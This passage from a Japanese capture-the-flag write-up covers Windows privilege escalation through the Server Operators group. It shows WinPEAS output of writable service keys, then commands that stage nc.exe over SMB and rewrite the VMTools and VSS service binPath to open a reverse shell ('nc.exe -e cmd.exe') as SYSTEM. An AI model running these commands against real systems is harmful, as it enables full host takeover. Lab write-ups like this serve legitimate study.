    HKLM\system\currentcontrolset\services\sermouse (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SessionEnv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\sfloppy (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SgrmAgent (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SgrmBroker (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SharedAccess (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ShellHWDetection (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\shpamsvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SiSRaid2 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SiSRaid4 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SmartPqi (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SmartSAMD (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\smbdirect (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\smphost (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SMSvcHost 4.0.0.0 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SNMP (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SNMPTRAP (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\spaceport (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SpbCx (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Spooler (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\sppsvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\srv2 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\srvnet (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SSDPSRV (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ssh-agent (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SstpSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\StateRepository (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\stexstor (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\stisvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\storahci (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\storflt (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\stornvme (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\storqosflt (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\StorSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\storufs (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\storvsc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\svga_wddm (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\svsvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\swenum (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\swprv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Synth3dVsc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SysMain (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SystemEventsBroker (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\TabletInputService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\tapisrv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\TCPIP6TUNNEL (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\tcpipreg (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\TCPIPTUNNEL (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\tdx (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\terminpt (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\TermService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Themes (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\TieringEngineService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\TimeBrokerSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\TokenBroker (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\TPM (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\TSDDD (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\TsUsbFlt (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\TsUsbGD (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\tsusbhub (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\tunnel (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\tzautoupdate (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UALSVC (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UASPStor (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UcmCx0101 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UcmTcpciCx0101 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UcmUcsi (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UcmUcsiAcpiClient (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UcmUcsiCx0101 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Ucx01000 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UdeCx (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\udfs (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UEFI (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UevAgentDriver (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UevAgentService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Ufx01000 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UfxChipidea (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ufxsynopsys (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UGatherer (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UGTHRSVC (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\umbus (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UmPass (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UmRdpService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UnistoreSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\upnphost (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UrsChipidea (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UrsCx01000 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UrsSynopsys (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\usbccgp (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\usbehci (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\usbhub (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\USBHUB3 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\usbohci (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\usbprint (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\usbser (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\USBSTOR (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\usbuhci (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\USBXHCI (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UserDataSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UserManager (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\UsoSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\VaultSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vdrvroot (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vds (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\VerifierExt (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\VGAuthService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vhdmp (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vhf (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vm3dmp (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vm3dmp-debug (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vm3dmp-stats (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vm3dmp_loader (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vm3dservice (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmbus (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\VMBusHID (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmci (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmgid (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmicguestinterface (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmicheartbeat (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmickvpexchange (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmicrdv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmicshutdown (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmictimesync (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmicvmsession (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmicvss (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\VMMemCtl (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmmouse (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\VMTools (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmusbmouse (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmvss (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmwefifw (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmxnet3 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vmxnet3ndis6 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\volmgr (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\volmgrx (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\volsnap (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\volume (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vpci (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vsmraid (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vsock (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vsockDll (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vsockSys (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\VSS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\VSTXRAID (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\vwifibus (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\w3logsvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\W3SVC (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WaaSMedicSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WacomPen (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WalletService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\wanarp (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\wanarpv6 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WarpJITSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WAS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WbioSrvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\wcifs (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Wcmsvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\wcnfs (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WdBoot (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Wdf01000 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WdFilter (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WdmCompanionFilter (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WdNisDrv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WdNisSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Wecsvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WEPHOSTSVC (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\wercplsupport (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WerSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WFPLWFS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WiaRpc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WIMMount (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WinDefend (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Windows Workflow Foundation 4.0.0.0 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WindowsTrustedRT (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WindowsTrustedRTProxy (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WinHttpAutoProxySvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WinMad (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WinNat (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WinQuic (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WinRM (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Winsock (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WinSock2 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WINUSB (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WinVerbs (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\wisvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WlanSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\wlidsvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WmiAcpi (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WMPNetworkSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Wof (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\workerdd (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WPDBusEnum (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WpdUpFltr (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WpnService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WpnUserService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ws2ifsl (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WSearch (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WSearchIdxPi (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\wuauserv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WudfPf (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WUDFRd (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\xmlprov (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\{6D282A92-22A5-4DCC-909E-3A11A53D9807} (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\{70A1C44A-FA0A-4993-8749-0419078CF998} (Server Operators [Allow: WriteKey GenericWrite])

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking write permissions in PATH folders (DLL Hijacking)
È Check for DLL Hijacking in PATH folders https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dll-hijacking
    C:\Program Files\iis express\PHP\v7.4
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
    C:\Windows\System32\OpenSSH\
    C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps
    

       /---------------------------------------------------------------------------------\                                                                                      
       |                             Do you like PEASS?                                  |                                                                                      
       |---------------------------------------------------------------------------------|                                                                                      
       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |                                                                                      
       |         Follow on Twitter         :     @hacktricks_live                        |                                                                                      
       |         Respect on HTB            :     SirBroccoli                             |                                                                                      
       |---------------------------------------------------------------------------------|                                                                                      
       |                                 Thank you!                                      |                                                                                      
       \---------------------------------------------------------------------------------/
```
wmiでSYSTEM権限で動いているサービスを確認できるが、アクセス拒否された  
[リンク](https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/)通りでvmtoolsサービスを変更する  
サービスで実行させるnc.exeを配送
```sh
└─$ cp /usr/share/windows-resources/binaries/nc.exe .

└─$ impacket-smbserver share . -smb2support
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```
```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> copy \\10.10.16.11\share\nc.exe .
```
vmtoolsサービスにnc.exeを登録、停止して再度開始
```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe query vmtools

SERVICE_NAME: vmtools
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_PRESHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config VMTools binPath= "C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.16.11 4444"
[SC] ChangeServiceConfig SUCCESS

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe stop VMTools

SERVICE_NAME: VMTools
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start VMTools
```
リバースシェル取得、ルートフラグゲット！
```sh
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.11] from (UNKNOWN) [10.129.163.190] 62863
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
99191ffff76401f77fc79142a148d963
```
ちなみに変更したサービスは十数秒で開始失敗しており、開始失敗するとnc.exe経由で取得したリバースシェルも終了する  
終了しないためには、cmd.exeからのnc.exeをしていすると良い
```powershell
sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.16.11 4444"
```
